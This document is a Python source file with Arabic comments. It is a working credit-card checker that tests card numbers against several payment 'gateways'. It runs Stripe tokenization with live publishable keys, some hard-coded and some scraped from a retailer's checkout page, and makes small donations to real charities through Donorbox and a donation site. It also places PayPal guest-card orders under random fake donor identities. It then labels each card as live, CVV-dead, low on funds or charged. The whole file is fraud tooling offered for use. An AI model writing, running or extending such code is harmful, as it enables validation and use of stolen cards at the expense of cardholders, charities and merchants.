"""
جميع البوابات - محدّثة بأقوى البوابات الشغالة
"""

import requests
import re
import random
import uuid
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# RAYSTEDE GATEWAY (الجديدة)
# ==========================================

def check_raystede(card_input):
    """فحص Raystede - Donorbox Stripe"""
    parts = card_input.split('|')
    if len(parts) < 4:
        return "INVALID", "صيغة خاطئة", ""

    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = '20' + yy
    if len(mm) == 1:
        mm = '0' + mm

    try:
        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 Chrome/148.0.7778.178 Mobile Safari/537.36',
        })

        # Stripe Token
        token_payload = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'payment_user_agent': 'stripe.js/v3',
            'referrer': 'https://donorbox.org',
            'key': 'pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT'
        }

        stripe_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }

        token_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=token_payload,
            headers=stripe_headers,
            timeout=15
        )

        token_json = token_resp.json()

        if 'error' in token_json:
            error_msg = token_json['error'].get('message', '')
            msg_lower = error_msg.lower()

            if 'incorrect' in msg_lower and 'cvc' in msg_lower:
                return "APPROVED", "✅ CCN Live / CVV Dead", ""
            if 'insufficient' in msg_lower:
                return "APPROVED", "✅ رصيد غير كافي", ""
            if 'expired' in msg_lower:
                return "DECLINED", "❌ بطاقة منتهية", ""
            if 'decline' in msg_lower:
                return "DECLINED", "❌ مرفوضة", ""
            return "DECLINED", f"❌ {error_msg}", ""

        pm_id = token_json.get('id')
        if not pm_id:
            return "ERROR", "فشل Token", ""

        # Donation request
        donation_data = {
            'amount': '1',
            'currency': 'GBP',
            'payment_method': pm_id,
            'donor_first_name': random.choice(['John', 'James', 'Robert']),
            'donor_last_name': random.choice(['Smith', 'Johnson', 'Brown']),
            'donor_email': f'test{random.randint(1000,9999)}@gmail.com',
            'anonymous_donation': 'false'
        }

        donate_resp = session.post(
            'https://donorbox.org/api/v1/donations',
            json=donation_data,
            headers={'Content-Type': 'application/json'},
            timeout=20
        )

        if donate_resp.status_code == 200 or 'success' in donate_resp.text.lower():
            return "CHARGED", "🎉 تم الشحن - £1", ""

        return "UNKNOWN", "نتيجة غير واضحة", ""

    except Exception as e:
        return "ERROR", f"خطأ: {str(e)}", ""

# ==========================================
# L-COM GATEWAY (جديدة)
# ==========================================

def check_lcom(card_input):
    """فحص L-com.com"""
    parts = card_input.split('|')
    if len(parts) < 4:
        return "INVALID", "صيغة خاطئة", ""

    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = '20' + yy
    if len(mm) == 1:
        mm = '0' + mm

    try:
        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })

        # Get Stripe PK from website
        page_resp = session.get('https://www.l-com.com/checkout', timeout=15)
        
        pk_match = re.search(r'pk_live_[A-Za-z0-9]+', page_resp.text)
        if not pk_match:
            return "ERROR", "فشل جلب PK", ""
        
        stripe_pk = pk_match.group(0)

        # Create payment method
        pm_payload = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'billing_details[name]': f"{random.choice(['John', 'James'])} {random.choice(['Smith', 'Brown'])}",
            'billing_details[email]': f'test{random.randint(1000,9999)}@gmail.com',
            'key': stripe_pk
        }

        pm_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=pm_payload,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com'
            },
            timeout=15
        )

        pm_json = pm_resp.json()

        if 'error' in pm_json:
            error_msg = pm_json['error'].get('message', '')
            msg_lower = error_msg.lower()

            if 'security code' in msg_lower or 'cvc' in msg_lower:
                return "APPROVED", "✅ CCN Live / CVV Dead", ""
            if 'insufficient' in msg_lower:
                return "APPROVED", "✅ رصيد غير كافي", ""
            if 'expired' in msg_lower:
                return "DECLINED", "❌ منتهية", ""
            return "DECLINED", f"❌ {error_msg}", ""

        pm_id = pm_json.get('id')
        if pm_id:
            # نجح في إنشاء payment method
            return "APPROVED", "✅ البطاقة صالحة", ""

        return "UNKNOWN", "نتيجة غير واضحة", ""

    except Exception as e:
        return "ERROR", f"خطأ: {str(e)}", ""

# ==========================================
# STRIPE GATEWAY (القديمة - احتياطية)
# ==========================================

def get_session():
    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36',
    })
    return session

def get_csrf_token(session):
    try:
        resp = session.get("https://friendsforsight.org/donate-online2", timeout=15)
        csrf_match = re.search(r'"csrf\.token":"([^"]+)"', resp.text)
        if not csrf_match:
            csrf_match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text)
        if csrf_match:
            return csrf_match.group(1)
    except:
        pass
    return None

def check_stripe_old(card_input):
    """فحص Stripe القديم (احتياطي)"""
    parts = card_input.split('|')
    if len(parts) < 4:
        return "INVALID", "صيغة خاطئة", ""

    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = '20' + yy

    try:
        session = get_session()
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            return "ERROR", "فشل CSRF", ""

        token_payload = {
            'guid': uuid.uuid4().hex[:32],
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'key': 'pk_live_2ZQLH8Ey19wgbFqciAkR2gig'
        }

        token_resp = requests.post(
            'https://api.stripe.com/v1/tokens',
            data=token_payload,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=15
        )

        token_json = token_resp.json()

        if 'error' in token_json:
            error_msg = token_json['error'].get('message', '')
            msg_lower = error_msg.lower()

            if 'incorrect_cvc' in msg_lower:
                return "APPROVED", "✅ CCN Live / CVV Dead", ""
            if 'insufficient_funds' in msg_lower:
                return "APPROVED", "✅ رصيد غير كافي", ""
            if 'expired_card' in msg_lower:
                return "DECLINED", "❌ منتهية", ""
            return "DECLINED", f"❌ {error_msg}", ""

        return "APPROVED", "✅ Token تم إنشاؤه", ""

    except Exception as e:
        return "ERROR", f"خطأ: {str(e)}", ""

# ==========================================
# PAYPAL GATEWAY
# ==========================================

CLIENT_ID = 'Abbl3qbVZxe9QoSsjOTNomMJy1WYEt-6m-t-N_duN7xPWKVnQnku51N6wPHnP9E0Nzu5C0qjuBYDXqnz'

def get_card_type(cc):
    if cc.startswith('4'):
        return 'VISA'
    elif cc.startswith(('51', '52', '53', '54', '55')):
        return 'MASTER_CARD'
    elif cc.startswith(('34', '37')):
        return 'AMEX'
    return 'VISA'

def get_paypal_access_token():
    try:
        token_resp = requests.post(
            'https://api.paypal.com/v1/oauth2/token',
            data={'grant_type': 'client_credentials'},
            headers={'content-type': 'application/x-www-form-urlencoded'},
            auth=(CLIENT_ID, ''),
            timeout=15
        )
        return token_resp.json().get('access_token')
    except:
        return None

def check_paypal(card_input):
    """فحص PayPal"""
    parts = card_input.split('|')
    if len(parts) < 4:
        return "INVALID", "صيغة خاطئة", ""

    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

    if len(yy) == 2:
        yy = '20' + yy
    if len(mm) == 1:
        mm = '0' + mm

    card_type = get_card_type(cc)

    try:
        access_token = get_paypal_access_token()
        if not access_token:
            return "ERROR", "فشل Token", ""

        fn = random.choice(['John', 'James', 'Robert'])
        ln = random.choice(['Smith', 'Johnson', 'Brown'])
        email = f'{fn.lower()}{random.randint(100,999)}@gmail.com'
        zip_code = str(random.randint(10001, 99999))

        order_payload = {
            "intent": "CAPTURE",
            "purchase_units": [{
                "amount": {"value": "1.00", "currency_code": "USD"}
            }],
            "payer": {
                "email_address": email,
                "name": {"name": f"{fn} {ln}"},
                "address": {"postal_code": zip_code, "country_code": "US"}
            }
        }

        order_resp = requests.post(
            'https://api.paypal.com/v2/checkout/orders',
            json=order_payload,
            headers={
                'Authorization': f'Bearer {access_token}',
                'Content-Type': 'application/json'
            },
            timeout=20
        )

        order_id = order_resp.json().get('id')
        if not order_id:
            return "ERROR", "فشل Order", ""

        graphql_payload = {
            "query": """
                mutation payWithCard($token: String!, $card: CardInput) {
                    approveGuestPaymentWithCreditCard(token: $token, card: $card) {
                        cart { cartId }
                    }
                }
            """,
            "variables": {
                "token": order_id,
                "card": {
                    "cardNumber": cc,
                    "type": card_type,
                    "expirationDate": f"{mm}/{yy}",
                    "postalCode": zip_code,
                    "securityCode": cvv
                }
            }
        }

        graphql_resp = requests.post(
            'https://www.paypal.com/graphql?paywithcard',
            json=graphql_payload,
            headers={
                'authorization': f'Bearer {access_token}',
                'content-type': 'application/json'
            },
            timeout=20
        )

        graphql_json = graphql_resp.json()

        if 'errors' in graphql_json:
            error_msg = graphql_json['errors'][0].get('message', '')
            msg_lower = error_msg.lower()

            if 'invalid_security_code' in msg_lower:
                return "APPROVED", "✅ CCN Live / CVV Dead", ""
            if 'insufficient_funds' in msg_lower:
                return "APPROVED", "✅ رصيد غير كافي", ""
            return "DECLINED", f"❌ {error_msg}", ""

        data = graphql_json.get('data', {}).get('approveGuestPaymentWithCreditCard', {})
        if data.get('cart', {}).get('cartId'):
            return "CHARGED", "🎉 تم الشحن - $1", ""

        return "UNKNOWN", "نتيجة غير واضحة", ""

    except Exception as e:
        return "ERROR", f"خطأ: {str(e)}", ""

# ==========================================
# Gateway Manager
# ==========================================

GATEWAYS = {
    'raystede': check_raystede,       # البوابة الجديدة
    'lcom': check_lcom,               # L-com
    'stripe': check_stripe_old,       # القديمة (احتياطي)
    'paypal': check_paypal
}

def check_card(gateway_name, card):
    """فحص بطاقة"""
    if gateway_name in GATEWAYS:
        return GATEWAYS[gateway_name](card)
    return "ERROR", "بوابة غير موجودة", ""

def get_available_gateways():
    """الحصول على البوابات المتاحة"""
    return list(GATEWAYS.keys())
